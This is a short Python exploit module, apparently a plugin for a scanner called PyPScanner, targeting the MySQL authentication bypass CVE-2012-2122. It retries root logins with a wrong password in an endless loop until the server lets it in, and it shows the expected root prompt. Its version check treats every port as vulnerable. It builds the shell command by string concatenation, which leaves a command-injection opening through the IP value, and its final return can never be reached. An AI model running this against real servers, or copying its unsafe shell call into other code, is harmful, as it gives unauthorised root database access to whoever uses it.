#encoding=utf-8
#author:PyPScanner Group
#date:2016.1

class mysqlExampleExp:

	def __init__(self,ip,versionList):
		self.ip = ip
		self.versionList = versionList

	def helpInfo(self):
		'''
		some information about this exploit...
		'''
		info = '''\nthis is the easy example exp of PyPScanner\nCVE ID：CVE-2012-2122\n\nDetails:\nhttp://bugs.mysql.com/bug.php?id=64884\n\nexploitDetails:\nhttp://seclists.org/oss-sec/2012/q2/493\nhttps://www.trustedsec.com/june-2012/massive-mysql-authentication-bypass-exploit'''
		return info

	def versionCheck(self):
		'''
		chek the version of mysql,to make sure weather the exp can be useful.
		这里为了演示作用，认为都有效果。漏洞具体细节可以参考前面helpInfo给出的链接。
		'''
		self.ablePort = []
		for pv in self.versionList:
			if True :
				self.ablePort.append(pv[0])

	def tryToAttack(self):
		'''
		if succeeded, the shell will stop at the welcome command page of mysql.

		like this:

		ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: YES)
		ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: YES)
		...
		...
		...
		ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: YES)
		ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: YES)

		-----------------------------------------------------------------------------------
		Reading table information for completion of table and column names
		You can turn off this feature to get a quicker startup with -A

		Welcome to the MySQL monitor. Commands end with ; or g.
		Your MySQL connection id is 24598
		Server version: 5.1.62-0ubuntu0.11.10.1 (Ubuntu)

		Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.

		Oracle is a registered trademark of Oracle Corporation and/or its
		affiliates. Other names may be trademarks of their respective
		owners.

		Type ‘help;’ or ‘h’ for help. Type ‘c’ to clear the current input statement.

		mysql> 

		'''
		self.versionCheck()
		if self.ablePort:
			import subprocess
			for port in self.ablePort:
				while 1:
					subprocess.Popen("mysql -h"+self.ip+" -P"+str(port)+" -u root mysql --password=blah",shell=True).wait()
				return 'Attack stop...'
		else:
			return 'The exploit can\'t be used for the version'

def expInit(ip,versionList):
	return mysqlExampleExp(ip,versionList)